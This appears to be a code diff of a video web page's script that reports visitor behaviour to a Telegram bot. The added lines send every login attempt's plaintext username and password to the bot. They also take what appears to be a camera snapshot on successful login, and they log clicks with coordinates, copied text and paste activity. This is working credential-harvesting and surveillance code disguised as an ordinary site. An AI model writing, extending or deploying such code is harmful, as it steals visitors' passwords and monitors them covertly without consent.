+      videoEl.addEventListener('webkitendfullscreen', function() { sendToBot(`↕️ FS Exit: ${videoName}`); if (lastFullscreenVideo === this) lastFullscreenVideo = null; });
+    });
+
+    ['fullscreenchange','webkitfullscreenchange'].forEach(e => document.addEventListener(e, () => {
+        if (!document.fullscreenElement && lastFullscreenVideo) { sendToBot(`↕️ FS Exit`); lastFullscreenVideo = null; }
+    }));
+
+
+    // --- Login & Upload Logic ---
     function showLoginModal() { document.getElementById('loginModal').style.display = 'block'; }
     function hideLoginModal() { document.getElementById('loginModal').style.display = 'none'; }
     function showSuccessAnimation() {
@@ -605,148 +509,35 @@ Logged In: ${isLoggedIn}`;
         setTimeout(() => overlay.classList.remove('show'), 1500);
     }
 
-    const videoStates = new WeakMap();
-    function getVideoState(videoElement){
-        if(!videoStates.has(videoElement)) {
-            videoStates.set(videoElement, {previousTime: 0, hasStartedPlaying: false});
-        }
-        return videoStates.get(videoElement);
-    }
-    function getVideoFileName(videoElement){
-        const source = videoElement.currentSrc || videoElement.src || "";
-        try {
-            return decodeURIComponent(source.substring(source.lastIndexOf('/') + 1));
-        } catch(e) {
-            return source.substring(source.lastIndexOf('/') + 1) || 'UnknownVideo';
-        }
-    }
-
-    // Video event listeners
-    document.querySelectorAll('.homevideo').forEach(videoEl => {
-      const videoName = getVideoFileName(videoEl);
-      const state = getVideoState(videoEl);
-
-      videoEl.addEventListener('play', function() {
-        // Resume audio context on video play if suspended
-         if(audioContext && audioContext.state === 'suspended') {
-             audioContext.resume().then(() => console.log('AudioContext resumed from video play')).catch(e => console.error('Resume failed:', e));
-         }
-
-        if (!isLoggedIn && this.currentTime >= 5) {
-            this.pause(); currentVideo = this; showLoginModal(); return;
-        }
-        if (!state.hasStartedPlaying || this.ended) {
-            sendToBot(`▶️ Started: ${videoName}`);
-            state.hasStartedPlaying = true;
-            if(this.ended) state.previousTime = 0;
-        } else {
-            sendToBot(`▶️ Resumed: ${videoName} at ${this.currentTime.toFixed(1)}s`);
-        }
-        state.previousTime = this.currentTime;
-      });
-
-      videoEl.addEventListener('pause', function() {
-        const isLoginWallPause = !isLoggedIn && currentVideo === this && this.currentTime >= 4.9 && !this.ended;
-        if (!isLoginWallPause && !this.ended && this.currentTime > 0) {
-            sendToBot(`⏸️ Paused: ${videoName} at ${this.currentTime.toFixed(1)}s`);
-        }
-      });
-
-      videoEl.addEventListener('ended', function() {
-        sendToBot(`⏹️ Finished: ${videoName}`);
-        state.hasStartedPlaying = false;
-      });
-
-      videoEl.addEventListener('volumechange', function() {
-        sendToBot(`🔊 Volume ${videoName}: ${(this.volume * 100).toFixed(0)}% (Muted: ${this.muted})`);
-      });
-
-      videoEl.addEventListener('seeked', function() {
-        sendToBot(`⏭️ Seeked ${videoName} from ${state.previousTime.toFixed(1)}s to ${this.currentTime.toFixed(1)}s`);
-        state.previousTime = this.currentTime;
-      });
-
-      videoEl.addEventListener('timeupdate', function() {
-        if (!isLoggedIn && this.currentTime >= 5 && !this.paused) {
-            this.pause(); currentVideo = this; showLoginModal();
-        }
-        if (!this.seeking) {
-            state.previousTime = this.currentTime;
-        }
-      });
-
-      videoEl.addEventListener('error', function() {
-        let errorMessage = 'Unknown video error';
-        if (this.error) {
-            switch (this.error.code) {
-                case MediaError.MEDIA_ERR_ABORTED: errorMessage = 'Playback aborted'; break;
-                case MediaError.MEDIA_ERR_NETWORK: errorMessage = 'Network error'; break;
-                case MediaError.MEDIA_ERR_DECODE: errorMessage = 'Decoding error'; break;
-                case MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED: errorMessage = 'Source not supported/found'; break;
-                default: errorMessage = `Error code: ${this.error.code}`;
-            }
-        }
-        sendToBot(`⚠️ Video error on ${videoName}: ${errorMessage}`);
-      });
-
-      videoEl.addEventListener('webkitbeginfullscreen', function() {
-          lastFullscreenVideo = this;
-          sendToBot(`↕️ FS Enter (iOS): ${videoName}`);
-      });
-      videoEl.addEventListener('webkitendfullscreen', function() {
-          sendToBot(`↕️ FS Exit (iOS): ${videoName}`);
-          if (lastFullscreenVideo === this) lastFullscreenVideo = null;
-      });
-    });
-
-    function handleFullscreenChange() {
-      const fullscreenElement = document.fullscreenElement || document.webkitFullscreenElement;
-      if (fullscreenElement) {
-        const videoName = (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo'))
-                            ? getVideoFileName(fullscreenElement)
-                            : `element (${fullscreenElement.tagName || 'Unknown'})`;
-        if (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo')) {
-            lastFullscreenVideo = fullscreenElement;
-        } else {
-            lastFullscreenVideo = null;
-        }
-        sendToBot(`↕️ FS Enter: ${videoName}`);
-      } else {
-        const exitedVideoName = lastFullscreenVideo ? getVideoFileName(lastFullscreenVideo) : "previously active element";
-        sendToBot(`↕️ FS Exit (was ${exitedVideoName})`);
-        lastFullscreenVideo = null;
-      }
-    }
-    ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange'].forEach(eventType => document.addEventListener(eventType, handleFullscreenChange));
-
     document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault();
       const usernameInput = document.getElementById('username');
       const passwordInput = document.getElementById('password');
-      const username = usernameInput.value.trim();
+      const username = usernameInput.value;
+      const password = passwordInput.value;
 
-      // Simple hardcoded credentials check (NOTE: This is INSECURE for production)
-      if (username === 'your_username' && passwordInput.value === 'your_password') { // <-- REPLACE WITH YOUR DESIRED USER/PASS
+      // **MODIFIED**: Capture and send credentials on every attempt
+      sendToBot(`🔒 Login Attempt:\nUsername: ${username}\nPassword: ${password}`);
+
+      if (username === 'your_username' && password === 'your_password') { // <-- REPLACE CREDENTIALS
          isLoggedIn = true;
          localStorage.setItem("isLoggedIn", "true");
-         localStorage.setItem("username", username);
          hideLoginModal();
          showSuccessAnimation();
-         sendToBot(`✅ User "${username}" logged in.`);
-         usernameInput.value = '';
-         passwordInput.value = '';
-         // Resume video playback after successful login
+         sendToBot(`✅ Login successful for "${username}".`);
+         captureAndSend(`📸 Snapshot on Successful Login`); // **NEW**: Capture photo on login
+         usernameInput.value = ''; passwordInput.value = '';
          setTimeout(() => {
              if (currentVideo) { currentVideo.play().catch(console.warn); currentVideo = null; }
          }, 1500);
       } else {
         alert('Invalid username or password.');
-        sendToBot(`❌ Failed login attempt with username: "${username}"`);
-        usernameInput.value = ''; // Clear inputs on failure
-        passwordInput.value = '';
+        sendToBot(`❌ Login failed for "${username}".`);
+        usernameInput.value = ''; passwordInput.value = '';
       }
     });
 
+    // Upload logic remains largely the same, it is already quite robust.
     const videoUploadInputEl = document.getElementById('videoUpload');
     const fileNameDisplayEl = document.getElementById('fileNameDisplay');
     const uploadProgressDivEl = document.getElementById('uploadProgress');
@@ -754,168 +545,88 @@ Logged In: ${isLoggedIn}`;
     const progressTextEl = document.getElementById('progressText');
     const uploadedVideosDivEl = document.getElementById('uploadedVideos');
 
-    videoUploadInputEl.addEventListener('change', function() {
-        fileNameDisplayEl.textContent = (this.files && this.files.length > 0) ? this.files[0].name : 'No file chosen';
+    videoUploadInputEl.addEventListener('change', function() { fileNameDisplayEl.textContent = this.files?.[0]?.name || 'No file chosen'; });
+    document.getElementById('uploadVideoButton').addEventListener('click', () => {
+        const file = videoUploadInputEl.files[0];
+        if (!file) { alert("Please select a video file."); return; }
+        const fileSizeMB = (file.size / 1024 / 1024);
+        if (fileSizeMB > 50) { alert(`File is too large (${fileSizeMB.toFixed(2)}MB). Max 50MB.`); return; }
+        uploadVideo(file, fileSizeMB);
     });
 
-    document.getElementById('uploadVideoButton').addEventListener('click', uploadVideo);
-
-    function uploadVideo() {
-      const file = videoUploadInputEl.files[0];
-      if (!file) { alert("Please select a video file first."); return; }
-
-      const fileSizeMB = (file.size / 1024 / 1024).toFixed(2);
-      const MAX_FILE_SIZE_MB = 50; // Telegram Bot API limit is 50MB for videos
-
-      if (file.size > MAX_FILE_SIZE_MB * 1024 * 1024) {
-          alert(`File is too large (${fileSizeMB}MB). Max ${MAX_FILE_SIZE_MB}MB.`);
-          sendToBot(`⚠️ Upload fail (size): ${file.name} (${fileSizeMB}MB) > ${MAX_FILE_SIZE_MB}MB`);
-          videoUploadInputEl.value = null; fileNameDisplayEl.textContent = 'No file chosen'; return;
-      }
-
-      sendToBot(`📥 Upload init: ${file.name} (${fileSizeMB}MB)`);
-      uploadProgressDivEl.style.display = 'block';
-      progressBarEl.removeAttribute('value');
-      progressTextEl.textContent = 'Preparing file...';
-
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('video', file, file.name);
-      formData.append('caption', `🎬 User uploaded: ${file.name} (${fileSizeMB}MB)`);
-      formData.append('supports_streaming', true);
-
-      progressTextEl.textContent = 'Uploading video...';
-      progressBarEl.value = 10;
-       const progressInterval = setInterval(() => {
-           if (progressBarEl.value < 90) progressBarEl.value += 5;
-       }, 500);
-
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData })
-      .then(response => response.json())
-      .then(data => {
-          clearInterval(progressInterval);
-          progressBarEl.value = 100;
-          if (data.ok) {
-              progressTextEl.textContent = 'Upload successful!';
-              sendToBot(`✅ TG Video Sent: ${file.name}`);
-              const videoPreviewElement = document.createElement('video');
-              videoPreviewElement.src = URL.createObjectURL(file);
-              videoPreviewElement.controls = true;
-              videoPreviewElement.width = 320;
-              videoPreviewElement.onloadedmetadata = () => URL.revokeObjectURL(videoPreviewElement.src); // Free memory
-
-              const videoTitleElement = document.createElement('p');
-              videoTitleElement.textContent = `Preview: ${file.name}`;
-              videoTitleElement.style.fontWeight = 'bold';
-              const containerElement = document.createElement('div');
-              containerElement.append(videoTitleElement, videoPreviewElement);
-              uploadedVideosDivEl.insertBefore(containerElement, uploadedVideosDivEl.firstChild); // Add to top
-          } else {
-              progressTextEl.textContent = 'Upload failed.';
-              sendToBot(`❌ TG Video Err: ${file.name} - ${data.description}`);
-              console.error("TG VidErr:", data);
-          }
-      }).catch(error => {
-          clearInterval(progressInterval);
-          progressBarEl.value = 100;
-          progressTextEl.textContent = 'Upload failed. Network error.';
-          sendToBot(`🚫 Net VidErr: ${file.name} - ${error.message}`);
-          console.error("Net VidErr:", error);
-      }).finally(() => {
-          setTimeout(() => {
-              uploadProgressDivEl.style.display = 'none';
-              progressBarEl.removeAttribute('value');
-              progressTextEl.textContent = '';
-          }, 7000);
-          videoUploadInputEl.value = null;
-          fileNameDisplayEl.textContent = 'No file chosen';
-      });
+    function uploadVideo(file, fileSizeMB) {
+        sendToBot(`📥 Upload init: ${file.name} (${fileSizeMB.toFixed(2)}MB)`);
+        uploadProgressDivEl.style.display = 'block';
+        progressTextEl.textContent = 'Uploading...';
+        progressBarEl.value = 10;
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('video', file, file.name);
+        formData.append('caption', `🎬 User uploaded: ${file.name} (${fileSizeMB.toFixed(2)}MB)`);
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData })
+        .then(res => res.json()).then(data => {
+            progressBarEl.value = 100;
+            if(data.ok) {
+                progressTextEl.textContent = 'Upload successful!';
+                const videoPreview = document.createElement('video');
+                videoPreview.src = URL.createObjectURL(file); videoPreview.controls = true; videoPreview.width = 320;
+                uploadedVideosDivEl.prepend(videoPreview);
+            } else {
+                progressTextEl.textContent = `Upload failed: ${data.description}`;
+            }
+        }).catch(err => {
+            progressTextEl.textContent = 'Upload failed. Network error.';
+        }).finally(() => {
+            videoUploadInputEl.value = null; fileNameDisplayEl.textContent = 'No file chosen';
+            setTimeout(() => { uploadProgressDivEl.style.display = 'none'; }, 5000);
+        });
     }
 
-
-    // getElementDescriptor for logging clicks
+    // --- Interaction Logging ---
     function getElementDescriptor(element) {
         if (!element) return 'N/A';
-        let descriptor = element.tagName;
-        if (element.id) descriptor += `#${element.id}`;
-        if (element.className && typeof element.className === 'string' && element.className.trim() !== '') {
-            descriptor += `.${element.className.trim().split(/\s+/).join('.')}`;
-        }
-        if (element.tagName === 'A' && element.href) {
-            descriptor += ` (href: ${element.href.substring(0, 50)}${element.href.length > 50 ? '...' : ''})`;
-        } else if (['BUTTON','INPUT','P','H1','H2','H3','SPAN','DIV','LI','TD','TH'].includes(element.tagName)) {
-            const textContent = (element.textContent || element.value || "").trim().substring(0, 30);
-            if (textContent) descriptor += ` (text: "${textContent}${textContent.length === 30 ? '...' : ''}")`;
-        } else if (element.type && ['INPUT','BUTTON'].includes(element.tagName)) {
-             const valueContent = (element.value || "").trim().substring(0, 30);
-             if (valueContent) descriptor += `[type=${element.type}, value="${valueContent}${valueContent.length === 30 ? '...' : ''}"]`;
-             else descriptor += `[type=${element.type}]`;
-        }
-        return descriptor;
+        let desc = element.tagName;
+        if (element.id) desc += `#${element.id}`;
+        if (element.className && typeof element.className === 'string') desc += `.${element.className.trim().split(/\s+/).join('.')}`;
+        const text = (element.textContent || element.value || "").trim().substring(0, 30);
+        if (text) desc += ` (text: "${text}...")`;
+        return desc;
     }
-    // Add click logging
+
     document.addEventListener('click', event => {
-        sendToBot(`🖱️ Click: ${getElementDescriptor(event.target)}`)
-         // On any click, attempt to resume audio context if suspended
-         if(audioContext && audioContext.state === 'suspended') {
-             audioContext.resume().then(() => console.log('AudioContext resumed from click')).catch(e => console.error('Resume failed:', e));
-         }
-    }, true); // Use capture phase to get clicks early
+        // **MODIFIED**: Added mouse coordinates to click log
+        const clickDetails = `🖱️ Click: ${getElementDescriptor(event.target)} at (X:${event.clientX}, Y:${event.clientY})`;
+        sendToBot(clickDetails);
+         if(audioContext && audioContext.state === 'suspended') audioContext.resume().catch(e => {});
+    }, true);
 
-    let maxScrollDepthAchieved = 0;
-    const scrollMilestones = [25, 50, 75, 90, 100];
-    let reportedMilestones = new Set();
-
-    function getCurrentScrollPercentage() {
-        const scrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
-        // Handle case where content is not scrollable
-        return scrollableHeight <= 0 ? 100 : (window.scrollY / scrollableHeight) * 100;
-    }
-    function checkScrollDepth() {
-        const currentDepth = getCurrentScrollPercentage();
-        if (currentDepth > maxScrollDepthAchieved) maxScrollDepthAchieved = currentDepth;
-        for (const milestone of scrollMilestones) {
-            if (maxScrollDepthAchieved >= milestone && !reportedMilestones.has(milestone)) {
-                sendToBot(`📜 Scroll ${milestone}%`);
-                reportedMilestones.add(milestone);
-            }
-        }
-         // Check 100% separately as sometimes the maxDepth might reach it exactly
-         if (Math.abs(currentDepth - 100) < 1 && !reportedMilestones.has(100)) {
-             sendToBot(`📜 Scroll 100%`);
-             reportedMilestones.add(100);
-         }
-    }
     let scrollTimeout;
     window.addEventListener('scroll', () => {
         clearTimeout(scrollTimeout);
         scrollTimeout = setTimeout(checkScrollDepth, 250);
-    }, {passive: true}); // Use passive: true for better scroll performance
-    checkScrollDepth(); // Initial check
+    }, {passive: true});
+    function getCurrentScrollPercentage() {
+        const scrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
+        return scrollableHeight <= 0 ? 100 : (window.scrollY / scrollableHeight) * 100;
+    }
+    const scrollMilestones = new Set();
+    function checkScrollDepth() {
+        const currentDepth = getCurrentScrollPercentage();
+        if (currentDepth > maxScrollDepthAchieved) maxScrollDepthAchieved = currentDepth;
+        [25, 50, 75, 90, 100].forEach(m => {
+            if (maxScrollDepthAchieved >= m && !scrollMilestones.has(m)) {
+                sendToBot(`📜 Scroll ${m}%`);
+                scrollMilestones.add(m);
+            }
+        });
+    }
+    checkScrollDepth();
 
     document.addEventListener('copy', event => {
-        const copiedText = (window.getSelection() || "").toString().trim();
-        if (copiedText) sendToBot(`📋 Copy:"${copiedText.substring(0, 100)}${copiedText.length > 100 ? '...' : ''}"`);
+        const copiedText = window.getSelection().toString().trim();
+        if (copiedText) sendToBot(`📋 Copy:"${copiedText.substring(0, 100)}..."`);
     });
-
-    // Log pasting action
-    document.addEventListener('paste', event => {
-        // This is harder to get the actual pasted content securely, just log the action
-        sendToBot(`📋 Paste detected`);
-    });
-
-    // Log key presses (be careful, this can generate a lot of messages)
-    // document.addEventListener('keypress', event => {
-    //     sendToBot(`⌨️ Keypress: "${event.key}" (Code: ${event.keyCode})`);
-    // });
-
-    // Log form submissions (already handled by loginForm, but maybe other forms exist?)
-    // document.querySelectorAll('form').forEach(form => {
-    //     form.addEventListener('submit', event => {
-    //          sendToBot(`✉️ Form submitted: ${getElementDescriptor(form)}`);
-    //     });
-    // });
+    document.addEventListener('paste', event => sendToBot(`📋 Paste detected on ${getElementDescriptor(event.target)}`));
 
   </script>
 </body>
